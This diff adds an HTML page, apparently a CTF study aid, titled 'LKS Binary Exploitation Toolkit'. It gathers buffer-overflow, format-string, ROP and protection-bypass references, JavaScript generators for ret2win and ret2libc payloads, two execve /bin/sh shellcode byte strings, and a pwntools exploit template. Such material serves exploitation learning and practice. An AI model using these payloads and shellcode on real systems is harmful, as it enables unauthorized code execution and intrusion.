@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LKS Binary Exploitation Toolkit</title>
+    <style>
+        :root {
+            --bg: #0f0f23;
+            --bg2: #1a1a2e;
+            --bg3: #16213e;
+            --accent: #ef4444;
+            --accent2: #f87171;
+            --text: #e0e0e0;
+            --text2: #888;
+            --success: #00ff88;
+            --border: #333
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px
+        }
+
+        header {
+            background: linear-gradient(135deg, #1a1a2e, #0f0f23);
+            border-bottom: 1px solid var(--border);
+            padding: 20px 0
+        }
+
+        header h1 {
+            font-size: 1.8rem
+        }
+
+        .badge {
+            background: var(--accent);
+            color: #fff;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: .7rem;
+            font-weight: 600
+        }
+
+        .tabs {
+            display: flex;
+            gap: 5px;
+            background: var(--bg2);
+            padding: 5px;
+            border-radius: 8px;
+            margin: 20px 0;
+            flex-wrap: wrap
+        }
+
+        .tab {
+            padding: 10px 15px;
+            background: transparent;
+            border: none;
+            color: var(--text2);
+            cursor: pointer;
+            border-radius: 6px;
+            font-size: .9rem
+        }
+
+        .tab:hover {
+            background: var(--bg3);
+            color: var(--text)
+        }
+
+        .tab.active {
+            background: var(--accent);
+            color: #fff;
+            font-weight: 600
+        }
+
+        .panel {
+            display: none
+        }
+
+        .panel.active {
+            display: block
+        }
+
+        .card {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px
+        }
+
+        .card h3 {
+            color: var(--accent);
+            margin-bottom: 15px
+        }
+
+        input,
+        textarea,
+        select {
+            width: 100%;
+            padding: 12px;
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text);
+            font-family: monospace
+        }
+
+        button {
+            padding: 10px 20px;
+            background: var(--accent);
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-weight: 600;
+            cursor: pointer
+        }
+
+        button:hover {
+            background: var(--accent2)
+        }
+
+        .btn-secondary {
+            background: var(--bg3);
+            color: var(--text)
+        }
+
+        .btn-small {
+            padding: 6px 12px;
+            font-size: .85rem
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px
+        }
+
+        .output-box {
+            background: #000;
+            border: 1px solid var(--border);
+            padding: 15px;
+            border-radius: 6px;
+            font-family: monospace;
+            min-height: 60px;
+            white-space: pre-wrap
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            background: var(--success);
+            color: #000;
+            border-radius: 8px;
+            font-weight: 600;
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all .3s;
+            z-index: 1000
+        }
+
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1
+        }
+
+        .mt-10 {
+            margin-top: 10px
+        }
+
+        .mb-10 {
+            margin-bottom: 10px
+        }
+
+        .flex-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap
+        }
+
+        .ref-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: .85rem
+        }
+
+        .ref-table th,
+        .ref-table td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid var(--border)
+        }
+
+        .ref-table th {
+            color: var(--accent)
+        }
+
+        .ref-table code {
+            background: var(--bg);
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: var(--success)
+        }
+
+        .link-card {
+            display: block;
+            padding: 15px;
+            background: var(--bg3);
+            border-radius: 8px;
+            text-decoration: none;
+            color: var(--text);
+            border: 1px solid transparent;
+            margin: 5px 0
+        }
+
+        .link-card:hover {
+            border-color: var(--accent)
+        }
+
+        .warning {
+            background: #7f1d1d;
+            border: 1px solid #dc2626;
+            border-radius: 6px;
+            padding: 10px;
+            margin-bottom: 15px;
+            color: #fca5a5
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="container">
+            <h1>LKS Binary Exploitation Toolkit <span class="badge">v2.0</span></h1>
+        </div>
+    </header>
+    <div class="container">
+        <div class="tabs">
+            <button class="tab active" onclick="showTab('bof')">Buffer Overflow</button>
+            <button class="tab" onclick="showTab('fmt')">Format String</button>
+            <button class="tab" onclick="showTab('rop')">ROP Chain</button>
+            <button class="tab" onclick="showTab('shellcode')">Shellcode</button>
+            <button class="tab" onclick="showTab('bypass')">Protection Bypass</button>
+            <button class="tab" onclick="showTab('pwntools')">Pwntools</button>
+        </div>
+
+        <div id="bof" class="panel active">
+            <div class="card">
+                <h3>Buffer Overflow Basics</h3>
+                <div class="warning">Stack layout (high to low): RET | RBP | Local Variables | Buffer</div>
+                <table class="ref-table">
+                    <tr>
+                        <th>Step</th>
+                        <th>Action</th>
+                    </tr>
+                    <tr>
+                        <td>1. Find offset</td>
+                        <td><code>cyclic 200 | ./vuln</code> then <code>cyclic -l &lt;crash_addr&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>2. Control RIP</td>
+                        <td>Overflow = padding + new_RIP</td>
+                    </tr>
+                    <tr>
+                        <td>3. Find win func</td>
+                        <td><code>objdump -d binary | grep win</code></td>
+                    </tr>
+                    <tr>
+                        <td>4. Build payload</td>
+                        <td><code>padding + p64(win_addr)</code></td>
+                    </tr>
+                </table>
+            </div>
+            <div class="card">
+                <h3>Offset Calculator</h3>
+                <div class="grid-2">
+                    <div><label>Buffer size</label><input type="number" id="bufSize" value="64"></div>
+                    <div><label>Saved RBP size</label><input type="number" id="rbpSize" value="8"></div>
+                </div>
+                <button class="mt-10" onclick="calcOffset()">Calculate</button>
+                <div class="output-box mt-10" id="offsetOut"></div>
+            </div>
+            <div class="card">
+                <h3>ret2win Payload Generator</h3>
+                <div class="grid-2">
+                    <div><label>Offset to RIP</label><input type="number" id="ret2winOffset" value="72"></div>
+                    <div><label>Win function address</label><input type="text" id="ret2winAddr" placeholder="0x401234">
+                    </div>
+                </div>
+                <button class="mt-10" onclick="genRet2win()">Generate</button>
+                <div class="output-box mt-10" id="ret2winOut"></div>
+            </div>
+        </div>
+
+        <div id="fmt" class="panel">
+            <div class="card">
+                <h3>Format String Attacks</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Specifier</th>
+                        <th>Action</th>
+                    </tr>
+                    <tr>
+                        <td><code>%p</code></td>
+                        <td>Leak stack pointer</td>
+                    </tr>
+                    <tr>
+                        <td><code>%x</code></td>
+                        <td>Leak hex value</td>
+                    </tr>
+                    <tr>
+                        <td><code>%s</code></td>
+                        <td>Leak string at address</td>
+                    </tr>
+                    <tr>
+                        <td><code>%n</code></td>
+                        <td>Write number of chars printed</td>
+                    </tr>
+                    <tr>
+                        <td><code>%N$p</code></td>
+                        <td>Leak Nth argument</td>
+                    </tr>
+                    <tr>
+                        <td><code>%N$n</code></td>
+                        <td>Write to Nth argument</td>
+                    </tr>
+                    <tr>
+                        <td><code>%hhn</code></td>
+                        <td>Write 1 byte</td>
+                    </tr>
+                    <tr>
+                        <td><code>%hn</code></td>
+                        <td>Write 2 bytes</td>
+                    </tr>
+                </table>
+            </div>
+            <div class="card">
+                <h3>Format String Calculator</h3>
+                <div class="grid-2">
+                    <div><label>Target address</label><input type="text" id="fmtAddr" placeholder="0x404040"></div>
+                    <div><label>Value to write</label><input type="text" id="fmtVal" placeholder="0x401234"></div>
+                </div>
+                <div class="grid-2 mt-10">
+                    <div><label>Offset to buffer</label><input type="number" id="fmtOffset" value="6"></div>
+                    <div><label>Bytes already printed</label><input type="number" id="fmtPrinted" value="0"></div>
+                </div>
+                <button class="mt-10" onclick="calcFmtStr()">Calculate %n Writes</button>
+                <div class="output-box mt-10" id="fmtOut"></div>
+            </div>
+            <div class="card">
+                <h3>Stack Leak Finder</h3>
+                <textarea id="fmtLeak" placeholder="Paste %p output: 0x1 0x2 (nil) 0x7ffe..."></textarea>
+                <button class="mt-10" onclick="analyzeLeak()">Analyze</button>
+                <div class="output-box mt-10" id="fmtLeakOut"></div>
+            </div>
+        </div>
+
+        <div id="rop" class="panel">
+            <div class="card">
+                <h3>ROP Chain Techniques</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Technique</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td>ret2libc</td>
+                        <td>Call system("/bin/sh") from libc</td>
+                    </tr>
+                    <tr>
+                        <td>ret2win</td>
+                        <td>Jump to existing win function</td>
+                    </tr>
+                    <tr>
+                        <td>ret2plt</td>
+                        <td>Call function through PLT</td>
+                    </tr>
+                    <tr>
+                        <td>ret2csu</td>
+                        <td>Use __libc_csu_init gadgets</td>
+                    </tr>
+                    <tr>
+                        <td>ret2dlresolve</td>
+                        <td>Abuse dynamic linker</td>
+                    </tr>
+                    <tr>
+                        <td>Stack pivot</td>
+                        <td>Move RSP to controlled area</td>
+                    </tr>
+                </table>
+            </div>
+            <div class="card">
+                <h3>Common Gadgets</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Gadget</th>
+                        <th>Use</th>
+                    </tr>
+                    <tr>
+                        <td><code>pop rdi; ret</code></td>
+                        <td>Set 1st argument</td>
+                    </tr>
+                    <tr>
+                        <td><code>pop rsi; pop r15; ret</code></td>
+                        <td>Set 2nd argument</td>
+                    </tr>
+                    <tr>
+                        <td><code>pop rdx; ret</code></td>
+                        <td>Set 3rd argument</td>
+                    </tr>
+                    <tr>
+                        <td><code>ret</code></td>
+                        <td>Stack alignment (16-byte)</td>
+                    </tr>
+                    <tr>
+                        <td><code>leave; ret</code></td>
+                        <td>Stack pivot</td>
+                    </tr>
+                    <tr>
+                        <td><code>xchg eax, esp; ret</code></td>
+                        <td>Stack pivot</td>
+                    </tr>
+                </table>
+                <p class="mt-10" style="color:var(--text2)">Find gadgets: <code>ROPgadget --binary ./vuln</code> or
+                    <code>ropper -f ./vuln</code></p>
+            </div>
+            <div class="card">
+                <h3>ret2libc Calculator</h3>
+                <div class="grid-2">
+                    <div><label>system() offset</label><input type="text" id="sysOffset" placeholder="0x4f440"></div>
+                    <div><label>/bin/sh offset</label><input type="text" id="binshOffset" placeholder="0x1b3e1a"></div>
+                </div>
+                <div class="grid-2 mt-10">
+                    <div><label>Libc base (leaked)</label><input type="text" id="libcBase" placeholder="0x7ffff7c00000">
+                    </div>
+                    <div><label>pop rdi; ret gadget</label><input type="text" id="popRdi" placeholder="0x401234"></div>
+                </div>
+                <button class="mt-10" onclick="calcRet2libc()">Calculate Addresses</button>
+                <div class="output-box mt-10" id="ret2libcOut"></div>
+            </div>
+            <div class="card">
+                <h3>Libc Database</h3>
+                <div class="grid-3">
+                    <a href="https://libc.blukat.me/" target="_blank" class="link-card">libc.blukat.me</a>
+                    <a href="https://libc.rip/" target="_blank" class="link-card">libc.rip</a>
+                    <a href="https://github.com/niklasb/libc-database" target="_blank"
+                        class="link-card">libc-database</a>
+                </div>
+            </div>
+        </div>
+
+        <div id="shellcode" class="panel">
+            <div class="card">
+                <h3>Linux x64 Shellcode</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Type</th>
+                        <th>Hex</th>
+                        <th>Size</th>
+                    </tr>
+                    <tr>
+                        <td>execve /bin/sh</td>
+                        <td><code>48 31 f6 56 48 bf 2f 62 69 6e 2f 2f 73 68 57 54 5f 6a 3b 58 99 0f 05</code></td>
+                        <td>23 bytes</td>
+                    </tr>
+                    <tr>
+                        <td>execve (shorter)</td>
+                        <td><code>31 c0 48 bb d1 9d 96 91 d0 8c 97 ff 48 f7 db 53 54 5f 99 52 57 54 5e b0 3b 0f 05</code>
+                        </td>
+                        <td>27 bytes</td>
+                    </tr>
+                </table>
+            </div>
+            <div class="card">
+                <h3>Syscall Reference (x64)</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Syscall</th>
+                        <th>RAX</th>
+                        <th>RDI</th>
+                        <th>RSI</th>
+                        <th>RDX</th>
+                    </tr>
+                    <tr>
+                        <td>read</td>
+                        <td>0</td>
+                        <td>fd</td>
+                        <td>buf</td>
+                        <td>count</td>
+                    </tr>
+                    <tr>
+                        <td>write</td>
+                        <td>1</td>
+                        <td>fd</td>
+                        <td>buf</td>
+                        <td>count</td>
+                    </tr>
+                    <tr>
+                        <td>open</td>
+                        <td>2</td>
+                        <td>filename</td>
+                        <td>flags</td>
+                        <td>mode</td>
+                    </tr>
+                    <tr>
+                        <td>execve</td>
+                        <td>59 (0x3b)</td>
+                        <td>filename</td>
+                        <td>argv</td>
+                        <td>envp</td>
+                    </tr>
+                    <tr>
+                        <td>mprotect</td>
+                        <td>10</td>
+                        <td>addr</td>
+                        <td>len</td>
+                        <td>prot</td>
+                    </tr>
+                </table>
+            </div>
+            <div class="card">
+                <h3>Shellcode Encoder</h3>
+                <textarea id="scIn" placeholder="Enter shellcode hex: 48 31 f6 56..."></textarea>
+                <button class="mt-10" onclick="encodeShellcode()">Encode</button>
+                <div class="output-box mt-10" id="scOut"></div>
+            </div>
+        </div>
+
+        <div id="bypass" class="panel">
+            <div class="card">
+                <h3>Protection Bypass Techniques</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Protection</th>
+                        <th>Bypass</th>
+                    </tr>
+                    <tr>
+                        <td>NX (No Execute)</td>
+                        <td>ROP chain, ret2libc, ret2plt</td>
+                    </tr>
+                    <tr>
+                        <td>Stack Canary</td>
+                        <td>Leak canary via format string, brute force (fork)</td>
+                    </tr>
+                    <tr>
+                        <td>PIE</td>
+                        <td>Leak binary base address, partial overwrite</td>
+                    </tr>
+                    <tr>
+                        <td>ASLR</td>
+                        <td>Leak libc address, brute force (32-bit)</td>
+                    </tr>
+                    <tr>
+                        <td>Full RELRO</td>
+                        <td>Cannot overwrite GOT, use other techniques</td>
+                    </tr>
+                    <tr>
+                        <td>Partial RELRO</td>
+                        <td>GOT overwrite still possible</td>
+                    </tr>
+                </table>
+            </div>
+            <div class="card">
+                <h3>Canary Detection</h3>
+                <div class="output-box">Canary characteristics:
+                    - Usually ends with 0x00 (null byte)
+                    - 8 bytes on 64-bit, 4 bytes on 32-bit
+                    - Random on each execution
+                    - Same within process (fork)
+
+                    Leak methods:
+                    1. Format string: %N$p
+                    2. Array out-of-bounds read
+                    3. Memory disclosure vulnerability</div>
+            </div>
+            <div class="card">
+                <h3>PIE Bypass</h3>
+                <div class="output-box">With PIE enabled:
+                    - All addresses are randomized
+                    - Need to leak binary base first
+                    - Partial overwrite (1-2 bytes) if offset known
+
+                    Common leaks:
+                    1. Format string: %N$p to leak return address
+                    2. Array read to leak GOT/PLT
+                    3. Subtract known offset to get base</div>
+            </div>
+        </div>
+
+        <div id="pwntools" class="panel">
+            <div class="card">
+                <h3>Pwntools Template</h3>
+                <textarea id="pwnTemplate" readonly style="min-height:300px">#!/usr/bin/env python3
+from pwn import *
+
+# Setup
+context.binary = elf = ELF('./vuln')
+context.log_level = 'debug'
+
+# libc = ELF('./libc.so.6')
+# rop = ROP(elf)
+
+# Local or remote
+# p = process('./vuln')
+p = remote('host', 1337)
+
+# Find offset
+# offset = cyclic_find(0x61616161)
+offset = 72
+
+# Build payload
+payload = b'A' * offset
+payload += p64(elf.symbols['win'])
+# payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+# payload += p64(next(elf.search(b'/bin/sh')))
+# payload += p64(elf.plt['system'])
+
+# Send
+p.sendlineafter(b'> ', payload)
+
+p.interactive()</textarea>
+                <button class="mt-10" onclick="copyPwn()">Copy Template</button>
+            </div>
+            <div class="card">
+                <h3>Useful Pwntools Functions</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Function</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>p64(addr)</code> / <code>p32(addr)</code></td>
+                        <td>Pack address (little-endian)</td>
+                    </tr>
+                    <tr>
+                        <td><code>u64(data)</code> / <code>u32(data)</code></td>
+                        <td>Unpack bytes to integer</td>
+                    </tr>
+                    <tr>
+                        <td><code>cyclic(200)</code></td>
+                        <td>Generate pattern</td>
+                    </tr>
+                    <tr>
+                        <td><code>cyclic_find(0x61616161)</code></td>
+                        <td>Find offset in pattern</td>
+                    </tr>
+                    <tr>
+                        <td><code>ROP(elf)</code></td>
+                        <td>ROP gadget finder</td>
+                    </tr>
+                    <tr>
+                        <td><code>elf.symbols['main']</code></td>
+                        <td>Get symbol address</td>
+                    </tr>
+                    <tr>
+                        <td><code>elf.got['puts']</code></td>
+                        <td>GOT entry address</td>
+                    </tr>
+                    <tr>
+                        <td><code>elf.plt['puts']</code></td>
+                        <td>PLT entry address</td>
+                    </tr>
+                    <tr>
+                        <td><code>next(elf.search(b'/bin/sh'))</code></td>
+                        <td>Search string in binary</td>
+                    </tr>
+                    <tr>
+                        <td><code>fmtstr_payload(offset, {addr: val})</code></td>
+                        <td>Format string payload</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+    </div>
+    <div class="toast" id="toast">Copied!</div>
+    <footer
+        style="text-align:center;padding:30px 20px;margin-top:40px;border-top:1px solid #333;color:#888;font-size:.9rem">
+        Made with &#10084; by <strong><a href="https://jovian.my.id" target="_blank"
+                style="color:#ef4444">Jovian</a></strong> |
+        <a href="https://github.com/vian0001" target="_blank" style="color:#888">GitHub</a>
+    </footer>
+
+    <script>
+        function $(id) { return document.getElementById(id) }
+        function showToast(m) { var t = $('toast'); t.textContent = m; t.classList.add('show'); setTimeout(function () { t.classList.remove('show') }, 2000) }
+        function copy(t) { navigator.clipboard.writeText(t); showToast('Copied!') }
+        function setOut(id, v) { $(id).textContent = v }
+
+        function showTab(name) {
+            document.querySelectorAll('.tab').forEach(function (t) { t.classList.remove('active') });
+            document.querySelectorAll('.panel').forEach(function (p) { p.classList.remove('active') });
+            event.target.classList.add('active');
+            $(name).classList.add('active');
+        }
+
+        function calcOffset() {
+            var buf = parseInt($('bufSize').value) || 64;
+            var rbp = parseInt($('rbpSize').value) || 8;
+            var total = buf + rbp;
+            var out = 'Buffer size: ' + buf + ' bytes\n';
+            out += 'Saved RBP: ' + rbp + ' bytes\n';
+            out += 'Offset to RIP: ' + total + ' bytes\n\n';
+            out += 'Payload structure:\n';
+            out += '[' + buf + ' bytes padding][' + rbp + ' bytes RBP][8 bytes RIP]\n\n';
+            out += 'Python: b"A"*' + total + ' + p64(win_addr)';
+            setOut('offsetOut', out);
+        }
+
+        function genRet2win() {
+            var offset = parseInt($('ret2winOffset').value) || 72;
+            var addr = $('ret2winAddr').value.trim() || '0x401234';
+            var out = '# ret2win payload\n';
+            out += 'offset = ' + offset + '\n';
+            out += 'win = ' + addr + '\n\n';
+            out += 'payload = b"A" * offset\n';
+            out += 'payload += p64(win)\n\n';
+            out += '# If MOVAPS issue (stack alignment):\n';
+            out += '# payload = b"A" * offset + p64(ret) + p64(win)';
+            setOut('ret2winOut', out);
+        }
+
+        function calcFmtStr() {
+            var addr = $('fmtAddr').value.trim();
+            var val = $('fmtVal').value.trim();
+            var offset = parseInt($('fmtOffset').value) || 6;
+            var printed = parseInt($('fmtPrinted').value) || 0;
+
+            if (!addr || !val) { setOut('fmtOut', 'Enter address and value'); return }
+
+            var addrNum = parseInt(addr, 16);
+            var valNum = parseInt(val, 16);
+
+            var out = 'Target: ' + addr + ' -> ' + val + '\n\n';
+            out += 'Using pwntools:\n';
+            out += 'payload = fmtstr_payload(' + offset + ', {' + addr + ': ' + val + '})\n\n';
+            out += 'Manual calculation:\n';
+            out += 'Write ' + valNum.toString(16) + ' (' + valNum + ') to ' + addr + '\n';
+            out += 'With %hhn (byte-by-byte) or %hn (2-byte)\n';
+            setOut('fmtOut', out);
+        }
+
+        function analyzeLeak() {
+            var input = $('fmtLeak').value.trim();
+            var parts = input.split(/[\s,]+/);
+            var out = 'Leak Analysis:\n\n';
+            parts.forEach(function (p, i) {
+                if (p === '(nil)' || p === '0x0' || p === '0') {
+                    out += '%' + (i + 1) + '$p = NULL\n';
+                } else if (p.startsWith('0x7f')) {
+                    out += '%' + (i + 1) + '$p = ' + p + ' (likely libc/stack)\n';
+                } else if (p.startsWith('0x4')) {
+                    out += '%' + (i + 1) + '$p = ' + p + ' (likely binary address)\n';
+                } else if (p.startsWith('0x55') || p.startsWith('0x56')) {
+                    out += '%' + (i + 1) + '$p = ' + p + ' (PIE binary address)\n';
+                } else {
+                    out += '%' + (i + 1) + '$p = ' + p + '\n';
+                }
+            });
+            setOut('fmtLeakOut', out);
+        }
+
+        function calcRet2libc() {
+            var sysOff = $('sysOffset').value.trim();
+            var binshOff = $('binshOffset').value.trim();
+            var base = $('libcBase').value.trim();
+            var pop = $('popRdi').value.trim();
+
+            if (!sysOff || !binshOff || !base) { setOut('ret2libcOut', 'Fill all fields'); return }
+
+            var baseNum = parseInt(base, 16);
+            var sysAddr = baseNum + parseInt(sysOff, 16);
+            var binshAddr = baseNum + parseInt(binshOff, 16);
+
+            var out = 'Calculated addresses:\n';
+            out += 'libc base: ' + base + '\n';
+            out += 'system(): 0x' + sysAddr.toString(16) + '\n';
+            out += '/bin/sh: 0x' + binshAddr.toString(16) + '\n\n';
+            out += 'Payload:\n';
+            out += 'payload = b"A" * offset\n';
+            if (pop) out += 'payload += p64(' + pop + ')  # pop rdi; ret\n';
+            out += 'payload += p64(0x' + binshAddr.toString(16) + ')  # /bin/sh\n';
+            out += 'payload += p64(0x' + sysAddr.toString(16) + ')  # system()';
+            setOut('ret2libcOut', out);
+        }
+
+        function encodeShellcode() {
+            var hex = $('scIn').value.replace(/\s/g, '');
+            var bytes = hex.match(/.{2}/g) || [];
+            var out = 'Length: ' + bytes.length + ' bytes\n\n';
+            out += 'Python bytes:\n';
+            out += 'shellcode = b"';
+            bytes.forEach(function (b) { out += '\\x' + b });
+            out += '"\n\n';
+            out += 'C array:\n';
+            out += 'unsigned char sc[] = {';
+            out += bytes.map(function (b) { return '0x' + b }).join(',');
+            out += '};';
+            setOut('scOut', out);
+        }
+
+        function copyPwn() { copy($('pwnTemplate').value) }
+    </script>
+</body>
+
+</html>
